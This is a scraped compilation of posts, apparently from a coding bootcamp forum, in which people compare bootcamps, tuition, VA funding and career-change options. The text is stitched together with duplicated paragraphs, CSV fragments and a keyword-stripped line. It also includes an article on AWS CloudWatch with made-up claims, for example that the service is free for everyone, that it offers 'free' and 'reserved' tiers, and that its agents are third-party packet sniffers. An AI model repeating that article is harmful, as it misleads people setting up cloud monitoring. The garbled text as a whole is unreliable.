Pros: NYC based and popular. I know some friends who went through and successfully found jobs. Curriculum seems more structured. Fullstack Javacript only with React frameworks. Their website claims only focusing on one language will allow students to learn more rather than cram multiple languages into three months. Because it is paid through VET TEC, they receive payments of 25% when enrolled, 25% when I complete the curriculum, 50% when I am employed.

Neutral: 19k which may imply a better experience. Also three months long with about a month of pre-foundation work. 60-80 hours a week which is no surprise.

Neg: Online which is not my thing. I may learn to enjoy and adapt, but from my military background., I am so used to going to work in-person. Because it's online, I only get a housing allowance of 950 a month which is nowhere near enough for NYC. I would have to dip into savings.

3) **Code Immersives** https://www.codeimmersives.com/programs/web-development-immersive/

Pro: Short description of curriculum says its focus is Javacript. There are also classes in cloud computing resulting in a certificate with AWS Solution Architect Associate. Class size is 15-20.

Neutral: 20k which again may imply a better experience. 45 weeks which is much longer than others, which may lead to better understanding of material. 4 days a week, 6 hours a week, which they claim is a ""more measured pace so that everyone with a desire to learn has the opportunity to succeed.""

Hybrid learning: mostly online. 1 out of 5 days is in person. Housing allowance as a result is 2k/month which is doable on a strict budget.

Work laptop provided which is cool I guess.

Neg: No syllabus or curriculum found. Not much known about it, no real reputation. Uses GI bill so all tuition is paid upfront.

Summary: All three seem like decent programs. I appreciate any advice from those who have gone through one of these.

Neg: Uses GI bill so the VA pays them all tuition upfront. Their curriculum seems messy. Starts with Fullstack curriculum with Javascript but spends time on Python and Ruby. Admissions is almost too easy. Aptitude test is like a SAT math exam. 

2) **Fullstacks** https://www.fullstackacademy.com/programs/coding-bootcamp

Pros: NYC based and popular. I know some friends who went through and successfully found jobs. Curriculum seems more structured. Fullstack Javacript only with React frameworks. Their website claims only focusing on one language will allow students to learn more rather than cram multiple languages into three months. Because it is paid through VET TEC, they receive payments of 25% when enrolled, 25% when I complete the curriculum, 50% when I am employed.

Neutral: 19k which may imply a better experience. Also three months long with about a month of pre-foundation work. 60-80 hours a week which is no surprise.

Neg: Online which is not my thing. I may learn to enjoy and adapt, but from my military background., I am so used to going to work in-person. Because it's online, I only get a housing allowance of 950 a month which is nowhere near enough for NYC. I would have to dip into savings.

3) **Code Immersives** https://www.codeimmersives.com/programs/web-development-immersive/

Pro: Short description of curriculum says its focus is Javacript. There are also classes in cloud computing resulting in a certificate with AWS Solution Architect Associate. Class size is 15-20.

Neutral: 20k which again may imply a better experience. 45 weeks which is much longer than others, which may lead to better understanding of material. 4 days a week, 6 hours a week, which they claim is a ""more measured pace so that everyone with a desire to learn has the opportunity to succeed.""

Hybrid learning: mostly online. 1 out of 5 days is in person. Housing allowance as a result is 2k/month which is doable on a strict budget.

Work laptop provided which is cool I guess.

Neg: No syllabus or curriculum found. Not much known about it, no real reputation. Uses GI bill so all tuition is paid upfront.

Summary: All three seem like decent programs. I appreciate any advice from those who have gone through one of these.

codingbootcamp,"I'm a NYS resident planning to move back to Brooklyn later this year, and have been wanting to use something towards my career for some time. I graduated from the Borough of Manhattan Community College with an AS in Animation and Motion Graphics. I also have a love for coding, but have realized the HUGE advantages to me starting UX Design to boost my graphic arts skills and general, web development know-how. 

One problem, though: I had to leave my job, recently, and the money I do have is being used solely for bills and general survival.

I've been looking all over the internet. Google Searches, Reddit Posts, LinkedIn, former internships and bootcamps, you name it. The only problem I'm running into is that I simply can't afford the extremely expensive cost of joining some of these bootcamps. For example, General Assembly is offering a program to me for $15k+ for their immersive bootcamp that includes resume + portfolio building. This would also include career coaching and possible placements. Sounds great in theory, but terrifying to someone who doesn't have that money to spare and knows that landing a job as a novice is pretty damn difficult (even with the organization's reputation).

So, how should I go about this? I've been looking into jobs that have paid training, as well, and apprenticeships that require no experience so that you can start from the ground up with that company. 

Would really appreciate some help on this one.",Most affordable and substantial UX Design bootcamp?,"I'm a NYS resident planning to move back to Brooklyn later this year, and have been wanting to use something towards my career for some time.

codingbootcamp,"I’m finishing up my first week at Hack Reactor, and I’m debating dropping out. Tomorrow is the last day to do so with a full refund. 

I knew going into this that it would be extremely challenging, but I also didn’t realize how little actual instruction we would get. So little of our time is spent actually learning. They seem to just throw us overboard and have us start immediately coding whatever concept we’re supposed to know. Today, we spent a total of 2 hours learning linked lists, trees, and hashes. These feel like concepts that we should spend 2 hours each on. At least. And 25% of that time was spent on re-explaining arrays as a pre-cursor to learning linked lists. I feel like the expectation is that I utilize resources outside of class to fully learn the material. Which would be fine, if the daily schedule did not go until 8 pm everyday. Again, I realize (and knew before coming into this) that such is the nature of a boot camp. I initially wanted to go the route of self-teaching, but went with a boot camp so that I’d have some sort of framework or guidance on what to learn. As well as the backing of a bootcamp in the job search process. 

Even if I decide to just power through, I’m equally, if not more, concerned with how much they talked about dismissing students from the program. They seem to be more than happy to dismiss students at any point during the program. I saw one comment on here that about 1/3 of students at Hack Reactor actually make it to the end. If that’s the case, I really cannot afford to take that gamble and risk wasting thousands upon thousands of dollars only to not make it through the program. I don’t have that kind of money or time. 

My current best alternative is to work and attend a part-time program, which also feels impossible as I’d have to dedicate around 20 hours to coding a week on top of a full-time job. I’m really not looking to self-learn either. 

I’m just feeling a little lost and was wondering if anyone had insight into Hack Reactor or advice.",Thoughts on Hack Reactor?,"I’m finishing up my first week at Hack Reactor, and I’m debating dropping out. Tomorrow is the last day to do so with a full refund.

codingbootcamp,"Anyone have any idea on career accelerators and how legit they are when it comes to getting job ready? I recently came across one called The Headstarter. Was referred to it by 2 guys I know that got jobs through it, one was a comp sci major that didn’t pursue tech jobs until he took the course, the other took a bootcamp and then joined the accelerator. 

From what I learned so far, this isn’t a full-on replacement for bootcamps, but it feels like it’s to help people that were not successful in pursuing a career in the past either after college or bootcamps. Apparently they do some intense coding sessions and help build up your portfolio. 

I’m still trying to find out more about it and have reached out to them to get on a call for more info.

codingbootcamp,"I've been combing through the endless number of bootcamps looking for one that I like and weighing cost vs benefit and I've narrowed my choice down to Codesmith and DevMountain.

I really like Codesmith's curriculum far more than DevMountain. I feel like I would learn a lot more and would have better chances of starting my tech career afterwards. The downsides are that it's twice the cost, and I'd have to wait until September to start (and I'm really looking forward to leaving my old career behind and starting a new one).

DevMountain is much more affordable and I could start in June, but I don't like that the second half of the course is Pluralsight and they're graduate hiring rates and salaries aren't nearly as good.

A little bit about me - I already know a decent amount of coding, self taught in HTML, CSS, React, Node, Typescript, etc. So I won't be going to learn how to code (I can already do that and teach myself), but instead I'll be going to learn how to collaborate with other developers on projects, to take advantage of the networking opportunities and career support, and to get something to put on my resume alongside my non-tech degrees.

I’m a US veteran living in the UK on a permanent basis. 

Looking to complete a coding boot camp to get better job prospects. I’m in a masters program now in the UK. It’s a humanities/science/artsy based course unrelated to anything tech and the job prospects particularly after COVID are just dismal.

I’ve been looking at American based coding boot camps like Code Platoon and Fullstack Academy which I believe would be covered under the VET TEC program offered by the VA.

I have a BBA and MACC in accounting. I currently work in high finance (private equity, investment banking, valuation). The pressure and time demands are considerable. I love modeling things, and build extensive Excel models for work and pleasure (fantasy sports, betting). 

I want to switch careers and learn to code. My interest is in machine learning and AI. The best path forward is probably to go part-time at my job, while taking coding classes/learning online. I am trying to figure out how long I would have to do that before I was meaningfully proficient.

How long is a reasonable expectation to learn to code? To start from zero and then understand the fundamentals of computer coding and be able to use one or two languages. I will be able to dedicate about 25 hours per week to the pursuit.

I was originally looking at the Thinkful bootcamp, as my best friend went through this program and landed a good job on the other side of it. He only had good things to say about it, and I was about 2 seconds from pulling the trigger before I stumbled upon some troubling reviews/information about the program that kind of made me a little suspicious and not as confident in that particular program, despite my friends' success in it.

There are some ones that have caught my eye (i.e. Nucamp, Hack Reactor, possibly Springboard or Flatiron, though I've seen some shoddy reviews for the latter 2), but there are so many courses out there, I'm feeling kind of overwhelmed with the choices and am having a hard time truly discerning which courses seem legitimately good or not, any help or direction would be greatly appreciated.

Also, I know it's common on this subreddit for people to say something along the lines of ""don't waste your money on any of this, youtube videos are free,"" but it's not about the money for me. I've tried on and off for years to teach myself to code using Udemy courses or other similarly cheap or free resources, and I can do it, but when I don't have an instructor or mentor there keeping my nose to the grindstone, it's super easy for me to lose motivation and get off track.

I've tried on and off for years to teach myself to code using Udemy courses or other similarly cheap or free resources, and I can do it, but when I don't have an instructor or mentor there keeping my nose to the grindstone, it's super easy for me to lose motivation and get off track. I need a bootcamp that has a structured course and instructors/mentors that will help keep me on it. I also have the money set aside specifically for this, so again, it's not about the money.Too many bootcamp options, how do I pick the right one?",searching week find right coding got money set aside attend step life right originally thinkful best friend went program landed job side thing say 2 second pulling trigger stumbled upon troubling reviewsinformation program kind made little suspicious confident particular program despite friend success since resigned basically scanning course report course review essentially feel id paying large sum money watch udemy video caught eye ie nucamp hack reactor possibly springboard flatiron though seen shoddy review latter 2 many course feeling kind overwhelmed choice hard time truly discerning course seem legitimately direction greatly appreciated common subreddit say something along line waste money youtube video free money tried year teach code using udemy course similarly cheap free resource instructor mentor keeping nose grindstone super easy lose motivation track structured course instructorsmentors keep money set aside specifically moneytoo many option pick right

codingbootcamp,"AWS CloudWatch is a monitoring service that provides you with information about the performance of your AWS resources and applications running hybrid or on premise. It also enables you to create custom metrics and monitor them on an ongoing or scheduled basis.

The Amazon CloudWatch API allows third-party developers to integrate their applications with these monitoring features and provide their users with a richer experience, while providing them the benefits offered by AWS such as cost savings and scalability. CloudWatch is a fully managed service, meaning that it does not require you to deploy or manage your own infrastructure.

### Amazon CloudWatch Categories:

CloudWatch has a large number of metrics available, which are grouped into categories such as uptime, traffic and memory. It also has custom performance metrics, which enable you to monitor your applications and the underlying infrastructure by using these new metrics instead of simple averages. You can create custom metrics, which give you finer granularity than other metrics. You can also monitor a whole application or only certain parts of it, such as a specific part of the page, a sub-section or even the entire application.

### Amazon CloudWatch Availability:

Amazon CloudWatch is available in all AWS Regions, and it’s free for all AWS customers. It is available in several languages: English, Japanese, German and Russian.

The more users, applications and resources you have on AWS, the more important it is to monitor its performance. AWS CloudWatch helps you to do this by providing several monitoring capabilities:

### CloudWatch Metrics:

Amazon CloudWatch also offers a large number of metrics from many AWS services. In addition to monitoring Amazon EC2 instances, CloudWatch can provide information about your Amazon Simple Storage Service (Amazon S3) buckets and files, for example. CloudWatch also monitors the performance of Amazon DynamoDB, Amazon Elastic MapReduce (Amazon EMR) and Amazon EC2 instances.

AWS CloudWatch provides data about most AWS services that offer monitoring capabilities. In addition to monitoring Amazon EC2, CloudWatch gathers data about:

Data gathered by CloudWatch is stored in an Amazon Simple Storage Service (Amazon S3). This means that the data is often distributed across multiple regions, the only limitation is storage capacity on all AWS Regions.

### What does AWS CloudWatch do?  

CloudWatch is a monitoring service that gives you insight into the state of your AWS resources, including Amazon EC2 instances, Amazon Elastic Load Balancers, and Amazon EBS volumes.

CloudWatch provides metrics to help you understand resource utilization, availability, and performance trends.  CloudWatch collects data from each of your AWS resources through event notifications.  This data can be accessed from the CloudWatch console or programmatically via an API or command-line interface (CLI).

### CloudWatch is composed of the following components: 

\* CloudWatch Events:  The way you send a notification of an event.  For example, you can select an SNS topic and schedule notifications to be sent when threshold values are met, or a resource has failed.

\* CloudWatch Logs:  Selecting log types and filtering logs by region, instance state, and customer can give you your desired level of detail.

### What are three things you can do in CloudWatch?  

CloudWatch is AWS’ real-time monitoring service that provides a wealth of different metrics for your EC2 instances, the health and performance of your running instances, and any changes made to the configuration.  What are three things you can do in CloudWatch?

#### 1.  Managed Metrics

One of the most important features of CloudWatch, and one of the features that I use all the time, is the ability to create real-time monitoring for your applications.  This also means you can give yourself alerts when a metric goes out of a particular range and take action.  You can set up alarms to get notified when something is wrong, or you need to restart your instance.

#### 2.  Monitoring Code

You can also monitor your applications by writing a monitoring script triggered by CloudWatch events.  This means you can monitor your application for any metric or health check or have per-application settings.

#### 3.  Real-Time Alerts

Other types of alerts are useful if your applications aren’t configured to send out notifications to some group.

### What types of monitoring can Amazon CloudWatch be used for?  

Amazon CloudWatch is an AWS service that can monitor the resources that are running in your AWS account.  With just a few minutes of configuration, you’ll be able to get data on CPU Utilization, Network In and Out traffic, disk read and write rates, HTTP Requests Queue Size, Disk Queue length etc.

Looking at the graphs and tables on Amazon CloudWatch, you can see what your resource usage is like overall or at all of your resources.

### But what if I have more than one resource in my account?  

The resource is your AWS account, and you have multiple resources such as EC2 instances, S3 buckets, SQS queues etc.  You can set up Amazon CloudWatch to monitor all of these resources simultaneously from a single dashboard.

However, we will focus on monitoring a single resource, i.e. your Amazon EC2 instance and will quickly look at the other types of resources that can be monitored later.

### How do you set up monitoring for your EC2 instance(s)?

You can start monitoring your EC2 instance(s) from the EC2 console.  Once you are signed in to the console, you will see an option for CloudWatch. Click on it to get started.

To monitor your EC2 instance(s), you must attach one or more monitoring rules to your AWS account.  A rule is a pattern that can be used by CloudWatch to filter out data from your resources based on conditions you specify.

### Is CloudWatch open source?

Amazon Web Services CloudWatch is a monitoring service for applications deployed on Amazon Web Services.

CloudWatch provides metrics and real-time analysis of your tasks, simplifying the process of running and optimizing your workloads.  The service can monitor many kinds of AWS resources, so it’s easy to integrate with other AWS services.  If you are not an Amazon customer, use one of the alternatives to CloudWatch that we’ve listed below.

CloudWatch can be used with any application running in the AWS Cloud.  The management interface is provided by the AWS Management Console, CLI or SDKs from Amazon and third-party vendors.

### CloudWatch has different service levels that you can choose from:

– Free: The service is not reserved from you and is used by anyone who wants to send metrics to the Amazon CloudWatch.  You can also use the service free with third-party vendors if they do not receive any payment from Amazon.

– Reserved: The service is reserved with your AWS account, and you can only monitor metrics sent by your AWS accounts or yourself.  You can monitor metrics sent to a CloudWatch subscribe or target resource.

### What is a CloudWatch agent?

CloudWatch agents are third-party applications that can be configured to monitor other systems and send metrics to CloudWatch.

For example, you could use a packet sniffer – a type of application that captures data packets sent over a network – on your computer as a CloudWatch agent to track your internet connection’s latency and average upload bandwidth.  The CloudWatch agent could then send the information to CloudWatch, which would make the data available for querying and graphing in CloudWatch.

For example, suppose your ISP has a customer support area that helps with billing and network issues.  You could use a packet sniffer or other software configured as a CloudWatch agent to track if there are delays when trying to reach them with support tickets.",What is Amazon CloudWatch?,"AWS CloudWatch is a monitoring service that provides you with information about the performance of your AWS resources and applications running hybrid or on premise. It also enables you to create custom metrics and monitor them on an ongoing or scheduled basis.

The Amazon CloudWatch API allows third-party developers to integrate their applications with these monitoring features and provide their users with a richer experience, while providing them the benefits offered by AWS such as cost savings and scalability. CloudWatch is a fully managed service, meaning that it does not require you to deploy or manage your own infrastructure.

### Amazon CloudWatch Categories:

CloudWatch has a large number of metrics available, which are grouped into categories such as uptime, traffic and memory. It also has custom performance metrics, which enable you to monitor your applications and the underlying infrastructure by using these new metrics instead of simple averages. You can create custom metrics, which give you finer granularity than other metrics. You can also monitor a whole application or only certain parts of it, such as a specific part of the page, a sub-section or even the entire application.

### Amazon CloudWatch Availability:

Amazon CloudWatch is available in all AWS Regions, and it’s free for all AWS customers. It is available in several languages: English, Japanese, German and Russian.

The more users, applications and resources you have on AWS, the more important it is to monitor its performance. AWS CloudWatch helps you to do this by providing several monitoring capabilities:

### CloudWatch Metrics:

Amazon CloudWatch also offers a large number of metrics from many AWS services. In addition to monitoring Amazon EC2 instances, CloudWatch can provide information about your Amazon Simple Storage Service (Amazon S3) buckets and files, for example. CloudWatch also monitors the performance of Amazon DynamoDB, Amazon Elastic MapReduce (Amazon EMR) and Amazon EC2 instances.

AWS CloudWatch provides data about most AWS services that offer monitoring capabilities. In addition to monitoring Amazon EC2, CloudWatch gathers data about:

codingbootcamp,"Hi guys! Starting a bootcamp in a couple days. I've already met with my tutor regarding pre-work. So far, he's excellent. Very eager to call me out on bad/messy formatting or introduce me to more efficient ways of doing something, or suggest additional ways to buff up my practice projects and make them more well rounded. Compared to what I've heard about most bootcamp administration/helpers, it looks like I really, really lucked out.

Since I have such a diligent tutor, I'm looking for advice on how to make the best out of our weekly 1hr sessions. In the last 2 meetings, I don't really have many questions prepped because I usually figure things out myself throughout the week. I usually just show him what I've been working on and ask for thoughts or ask him to explain a concept that I'm struggling to figure out the application of.

I'll ask my tutor the same question, but I figured other bootcampers probably have some good advice too. What would you suggest?

Since I have such a diligent tutor, I'm looking for advice on how to make the best out of our weekly 1hr sessions. In the last 2 meetings, I don't really have many questions prepped because I usually figure things out myself throughout the week. I usually just show him what I've been working on and ask for thoughts or ask him to explain a concept that I'm struggling to figure out the application of.

I'll ask my tutor the same question, but I figured other bootcampers probably have some good advice too. What would you suggest?

PS: If context helps, I'm in a Trilogy bootcamp.

It’s my second week in my boot camp, and it’s pretty intense and fast paced.

I have an EE degree and professional experience with C and some side experience with Python and other scripting languages but I'm looking to transition to full stack web dev. So I have experience coding and picking up new languages on my own but I'm looking to take a bootcamp course to get the ""full picture"" in a concise manner. My concern is that most courses are sold towards ""absolute beginners"" and I'm afraid I'd be wasting time with the CS101 stuff. 

So my question is, are there more ""advanced"" bootcamps I could check out? Or alternatively, would it be feasible to write my own curriculum and patch together a number of courses on individual topics (e.g. take a React course, a Javascript course, a SQL course) and then come up with my own projects to build a portfolio. I think the second option would provide more depth on each topic but I'm afraid I wouldn't get the same breadth of knowledge because it's hard to know what you don't know!

codingbootcamp,"I've been reading this sub for several days now. Every post basically crowns codesmith the king by far, which I don't doubt. 

I've gathered that the interview process for CS is pretty rigorous, and it might take me several more months to prepare for that than another bootcamp, is it worth it? 

For reference, I know most camps focus on JS as the language, but I learned enough Java in the last few months to consistently solve leetcode easy or up to like 5 or 6 kyu on codewars questions in the optimal space/time complexity, but can't really do much beyond that. I spent the last 2 weeks learning a decent amount of JS to get myself up to level I was at in Java. 

I have a job right now I can quit and live with my parents rent free, but I'd like to actually be enrolled in a course before I do that (this hinders my ability to quickly learn the base concepts probably necessary to apply successfully for CS). Is there some magical second tier of bootcamp below CS that is worth doing that still has some coding knowledge prerequisite that I could attend instead of studying slowly for the CS entrance? Obviously I don't expect the alternatives to be as good as CS, but in my mind it might be worth it to just start a bootcamp sooner rather than later.

I see mixed reviews for basically every other bootcamp on this subreddit that isn't CS (hackreactor, full stack, app academy, etc.), so it's hard to know which one's are worth my time, if any. Any input would be greatly appreciated.

For reference, I know most camps focus on JS as the language, but I learned enough Java in the last few months to consistently solve leetcode easy or up to like 5 or 6 kyu on codewars questions in the optimal space/time complexity, but can't really do much beyond that. I spent the last 2 weeks learning a decent amount of JS to get myself up to level I was at in Java. 

I have a job right now I can quit and live with my parents rent free, but I'd like to actually be enrolled in a course before I do that (this hinders my ability to quickly learn the base concepts probably necessary to apply successfully for CS). Is there some magical second tier of bootcamp below CS that is worth doing that still has some coding knowledge prerequisite that I could attend instead of studying slowly for the CS entrance? Obviously I don't expect the alternatives to be as good as CS, but in my mind it might be worth it to just start a bootcamp sooner rather than later.

I see mixed reviews for basically every other bootcamp on this subreddit that isn't CS (hackreactor, full stack, app academy, etc.), so it's hard to know which one's are worth my time, if any. Any input would be greatly appreciated.

I am a graduating senior in college with a nontechnical background. However, I really want to learn coding skills.

Once I reach a mid-level amount of knowledge, I would take a bootcamp to prepare for interviews and work on my skills in a more intense environment. However, I see so many bad reviews of people dropping bc of bad instructors, lack of time, or the pace moving too fast.

codingbootcamp,"I finished thinkful but totally hated going through it. The only reason I went through with it is because my bf but in the end he even regretted it due to the almost 40k debt and learning experience. 

He had a great mentor where as I had a horrible mentor. I recently contacted my mentor for a reference and he said he didn’t remember me… even though he has evidence we met on zooms through a period of 11 weeks. His reference was only 8 words long, spelling two of the words wrong… he had a bachelors in English and he is a professor at a UC like wtf. He couldn’t even give me a decent reference. 

Mentor sessions with him were painful usually him just leading it to talk about the work force even when I needed help with my work. 

The instructors really went out of their way to help with the crappy curriculum they were given.

TAs were ok but many of them either gave code(code to copy and paste to pass tests) or sent us to free material like Codecademy or freecodecamp. Like I’m sorry I’m not paying hella money just to get free shit and copy/paste. 

After I finished the boot camp they pushed us to get jobs that we didn’t qualify for at all. Saying things like my 6 months at my boot camp equates to two years of work experience… I highly doubt that.

codingbootcamp,"Hello everybody,

I am currently facing the question for which coding bootcamp I should choose. I plan to do the bootcamp remote.

I have been on the phone with both Iron Hack and Careerfoundry for Web Development.

Iron Hack goes for 2,5 months and Careerfoundry on the other hand goes for 5-6 months, however Careerfoundry seems to be bigger and more established and offers a job search guarantee (otherwise it's money back).

Iron Hack, however, seems to be more team-based and group learning, whereas Careerfoundry has a curriculum that you work on mostly independently and can interact with other students via chat.

Has anyone here had experience with either camp or even knows both?

I am interested in starting coding/programming and Ive done some research on the industry and qualifications.
From what Ive seen theres 3 routes, university, boot camp or self taught.
At the moment Im deciding between university (CS) or boot camp.
Ive looked at some courses and they seem a little bit too expensive, 10k above.
Yes I understand uni is more expensive in the long run however my train of thought is this;
If I commit to boot camp, I will HAVE to pay that, regardless of if I enjoy it or not.
However with university I have the option of doing a class and testing it out and dropping before census date if I was not to enjoy it.
At the moment I am studying a bachelors of physio so I can easily switch my major.
I also understand that a degree is not needed and its based on skill and what you can do, however a degree added to that could help me.
Anyone got advice for me? Am I missing something with this boot camp or will a degree serve me better.

codingbootcamp,"Hey everyone,

Been part of this community for the last few months and it has been really great to see people thinking about what steps they need to take for a career change. **Full transparency, i do work at a coding school** (kenzie academy) and have been for the last four years after working nine years in higher ed. 

I wanted to give some general advice about thinking through which coding school is best for you as I see a lot of people asking the same questions. In the end, no matter which school you choose, i hope the best in your outcomes! Make sure to think through the time commitment and support,  but mostly believe in yourself that you have the ability to do it. I’ve seen folks form distribution centers, retail, restaurants, bartenders, vets, pilots, drivers, etc… all now working in tech.

First, I 100% recommend sitting down and working through the vast amount of free resources out there. Take the weekend and work eight hours a day and just make sure you are passionate and enjoy doing the work. 

As you are evaluating schools there are three things you should really focus in on:

1. What does **academic** support look like during the program?  So for example, if you get stuck on a problem, how do you get help? Is there 1x1 help from a coach or teacher assistant? Is there an online wiki like stack overflow that you can search? How fast should you expect to get a response from a person?
2. What does **career** support look like during and after the program? Most schools offer resume and interview support during the program with a window of time after a person completes a program. Also examine if there is a person who is actively doing outreach to business organizations for job placement.
3. Find **alumni** and LinkedIn with jobs and **ask them** how their experience went. The majority of folks will be honest with you and are happy to help people think it through.

Happy to honestly answer questions people might have about stepping into tech.",Some thoughts on how to select the right coding school,"Hey everyone,

Been part of this community for the last few months and it has been really great to see people thinking about what steps they need to take for a career change. **Full transparency, i do work at a coding school** (kenzie academy) and have been for the last four years after working nine years in higher ed. 

I wanted to give some general advice about thinking through which coding school is best for you as I see a lot of people asking the same questions. In the end, no matter which school you choose, i hope the best in your outcomes! Make sure to think through the time commitment and support,  but mostly believe in yourself that you have the ability to do it. I’ve seen folks form distribution centers, retail, restaurants, bartenders, vets, pilots, drivers, etc… all now working in tech.

First, I 100% recommend sitting down and working through the vast amount of free resources out there. Take the weekend and work eight hours a day and just make sure you are passionate and enjoy doing the work. 

As you are evaluating schools there are three things you should really focus in on:

1. What does **academic** support look like during the program?  So for example, if you get stuck on a problem, how do you get help? Is there 1x1 help from a coach or teacher assistant? Is there an online wiki like stack overflow that you can search? How fast should you expect to get a response from a person?
2. What does **career** support look like during and after the program? Most schools offer resume and interview support during the program with a window of time after a person completes a program. Also examine if there is a person who is actively doing outreach to business organizations for job placement.
3. Find **alumni** and LinkedIn with jobs and **ask them** how their experience went. The majority of folks will be honest with you and are happy to help people think it through. 

There are a lot of other things you can ask as well like what does the online learning community look like? What speaker and events exist? Are there virtual career fairs, if so how often.

Or should I just try to work on open source stuff and get as good as I can at leetcode and the like? Any advice on a next step would be amazing.

Hi everyone, I need a bit of advice, Im currently 22 about to be 23 doing a bachelors in chiropractic and second guessing myself. Im just not enjoying it as much as I thought. I have been interested in programming/coding for a while but have never properly tried it. I did 1 class in 8th grade with web design, doing very basic coding however I am keen to properly give it a go. I talked to my co worker and he told me he thinks that its a waste of time since its too late and thinks that the people doing computer science/coding have been doing this out of high school and this was something I should’ve started a while ago (which didn’t discourage me because its a stupid statement) however I want to know to what extent is this true to, I currently have 0 knowledge whatsoever with coding, but I am keen to learn this. Is there something I should brush up on before I get into this? Maths ect.
And should I switch my major to CS for 1 semester and give it a go?
Since Id have to take a semester off to give the boot camp a go!
Any advice would be great thanks",Advice,"

I've been teaching myself to code since Feb/March a little bit on and off. I've done the FCC HTML/CSS cert, I've done some of Codesmith's CSX and their JSB program and I've enjoyed all of that. I've also done some of 100Devs and learned from there.

I like doing JavaScript and figuring out how to solve problems, I find that really satisfying and fun. I've also gone to Codesmith's JavaScript Hard Parts workshops and have found that interesting and it makes me wanna learn more and try more. 

But I don't really look forward to building website mock-ups in the 100Devs programs, I find it to be tedious and CSS to be frustrating. And I'm anxious that I'll find the rest of programming to be the same - I keep trying to learn more to see if I wanna pursue it or not but I don't know at which point I'll know enough to make a decision.

codingbootcamp,"Hi everyone, I have a dilemma and would love if you would comment and/or offer your advice.  I want to switch careers, I am not utilizing my brain or at where i believe my income matches what I want in life.  I am debt free, single, and living in the midwest.  I  have a undergrad degree in a non-technical field.

Post Bacc route: Cost - $5,000 - $10,000. The school would most likely be WGU for their BSCS.  I have 30% of the course finished as my general education courses will transfer in.  I can also take plenty of classes online that will transfer in prior to starting. 

* Pros: It's a degree and it ticks the HR box.  It provides a foundation instead of a fast-track.  
* Cons: I will be learning a lot of topics by myself.  There are resources, and this is not generally hard for me, but I like some structure.  The math is going to be tough, but I will do what I have to do in the end.  I have considered a less technical degree at this school to avoid the math, but know deep down I will be doing my future-self a disservice.
   * Also, no job placement guarantee. 

Bootcamp: Cost - &lt;$20k for one with a great reputation and good job placement. 

* Pros: I will get done sooner, and also have more time to focus on technical skills such as leet-code problems, learning algorithms, or other things that will benefit my on the job opposed to learning a broad range of skills for the BSCS that may not apply.
* Cons: Costs more and I will have to take out a loan. Will not have foundational knowledge.  May hinder my cap as it may not tick the HR do-they-have-a-CS related degree box.

codingbootcamp,"So... I joined a bootcamp that starts in a little over a week, and I am fairly nervous as I have ZERO coding experience. 

A little bit about me... late 20s, hold a BA, and have worked in a few different areas i.e. Hotel, Healthcare, Education. 

I've been at the same job for nearly 5 years and wanted a change. I had heard about web development/coding/programming etc. online through YouTube/TikTok, and it seemed like something I would want to try. 

BUT... I did not know where to start. I could go back to school... do a bootcamp... But I am not usually the kind of person that takes risks. 

So I kinda put it off to the side... for about 6ish months. Then I ran into an old friend from high school at a funeral and of course... I treated it as a networking event. 

Turns out... she was a junior developer. I was surprised because I didn't know she knew how to code. Well, she didn't. She actually found this company that offers a full stack web development bootcamp and so long as you pass the bootcamp and are pleasant to work with, they offer you a job. 

This sounded pretty perfect because it was about as low risk as I could get.

I would still be leaving my job and be unemployed for 3 months but doing this bootcamp would basically guarantee me a job and kickstart my career. 

So last week, I spoke to my friend's recruiter, another recruiter, took a couple assessments and passed and interviewed. Luckily, I got in. 

I've been warned by literally everyone... my friend, the recruiters, the person who interviewed me, my other friend who majored in computer science... literally everyone... that the bootcamp is very difficult. Like super hard apparently. 

Is it?

I guess I will see. I got recommended some Codecademy links to learn the fundamentals of HTML and JAVA before the bootcamp starts so started that journey. So far so good.

codingbootcamp,"Hi all,

I'm trying to get a job as a front-end or full-stack developer. I've been applying for jobs for the past year, and nothing has gotten past the interview phase.

I'm in the process of developing my portfolio and GitHub to add more fully fleshed-out apps. But I feel like there is something major ""missing"" that causes potential employers to lose interest.

I'm not entirely sure what that ""missing"" thing is. One employer who turned me down noted that the other candidate had a Computer Science degree, and I didn't. (I have a bachelor's but it's not in CS). I've narrowed down two choices that I think will give me a big leg up. Either go to a boot camp, or get a master's in CS. I don't think a bachelor's in CS is a viable option since that's four years of study.

The reason I'm ambivalent between the two options is because there seem to be a lot of bootcamps out there with poor job attainment rates. I talked to a rep for a bootcamp that was affiliated with my university, and they said that the bootcamp was for skills improvement, not specifically for finding a job. Sorry, I'm not dropping $10k for that.

So, my question is...what should I do? Does getting a master's in CS improve your ability to get a junior dev job? It feels like overkill, but then again, it would open some doors for me.

codingbootcamp,"Hi all!

Recently got accepted to App Academy's 24 week full-time online coding bootcamp, along with Oregon State University's Post-Bacc(2nd bachelor's degree) program in CS and need some help deciding which one to attend.

A bit about me:

Late 20's, BA in Economics from UC Berkeley with 7 years experience working in the start-up/tech space in non-engineering roles such as account management and solutions/pre-sales consulting. I've worked at companies such as Workday, Stripe, and I'm currently at Slack/Salesforce. 

I grew up in the Bay Area, and have a pretty large network of referrals I can utilize. A lot of my close friends/college alumni/family members have connections to FAANG companies and are more than willing to refer me once the time comes for job apps. 

Cost really isn't really an issue for me. 

Pros of a/A: $20k cost, finish the program in 6 months, and get employed sooner(hopefully by end of the year)

Cons: Not eligible for most internships(most require you're enrolled in a degree seeking program), negative stigma perceived surrounding bootcamps 

Pros of OSU: BS in CS from a reputable university, eligibility for internships

Cons of OSU: Slightly more expensive, and 2 years to complete(1.75 years if I stack classes every quarter).

Leaning more towards a/A due to the quicker turnaround time from learning -&gt; job hunt.",App Academy vs OSU Post Bacc CS,"Hi all!

codingbootcamp,"Hey guys, I’m a bit conflicted on the whole boot camp route for a specific reason:

I’m 23 and have no prior ”real” work experience aside from my small commercial/real estate photography business that I’ve been running for a few years. Also, I have no degree.

This concerns me because it seems like most of the boot camp grad stories I see are from people with prior work experience at companies where they already had established careers or from people that have irrelevant degrees, but have degrees nonetheless which looks good to employers.

So I’m essentially in a position where I have no prior “real” work experience or a degree to show, which I intuitively think will work against me. I’m just not fully convinced that a company would hire a 23 year old with no real prior work experience or any degree to show.

I’m 100% open to going back to college and finishing my bachelors, but also find the boot camp path very appealing as I feel like time is fleeting.

i am graduating in August with a bachelors in a stem field i have no interest in, and am going to law school in a year or two (depending on combination of financial situation and when i get accepted to schools i like). i took comp sci in high school (although it was essentially just ap codecademy) and really enjoyed it, and i have recently started doing simple introductory lessons again in my free time. 

